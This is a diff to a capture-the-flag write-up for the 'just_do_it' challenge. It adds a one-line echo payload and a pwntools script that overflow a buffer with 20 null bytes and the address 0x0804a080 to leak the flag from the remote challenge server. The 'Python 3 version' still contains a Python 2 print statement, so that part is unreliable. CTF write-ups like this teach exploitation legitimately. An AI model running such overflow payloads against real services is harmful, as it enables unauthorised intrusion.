@@ -152,6 +152,11 @@ Input the password.
 flag{gottem_boyz}
 ```
 
+This code depends on python version and in some cases doesn't work. If it didn't work for you, try this one:
+```
+  echo -n -e '\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\xa0\x04\x08' > ./just_do_it-56d11d5466611ad671ad47fba3d8bc5a5140046a2a28162eab9c82f98e352afa
+```
+
 So we were able to read the contents of `flag.txt` with our exploit. Let's write an exploit to use the same exploit against the server they have with the challenge running to get the flag. Here is the python code:
 
 ```
@@ -166,6 +171,26 @@ print target.recvuntil("password.\n")
 
 #Create the payload
 payload = "\x00"*20 + p32(0x0804a080)
+
+#Send the payload
+target.sendline(payload)
+
+#Drop to an interactive shell, so we can read everything the server prints out
+target.interactive()
+```
+
+```
+# Python 3 version (tested on 3.9.7)
+from pwn import *
+
+#Create the remote connection to the challenge
+target = remote('pwn1.chal.ctf.westerns.tokyo', 12482)
+
+#Print out the starting prompt
+print target.recvuntil("password.\n")
+
+#Create the payload
+payload = b'\x00' * 20 + b'\x80\xa0\x04\x08'
 
 #Send the payload
 target.sendline(payload)
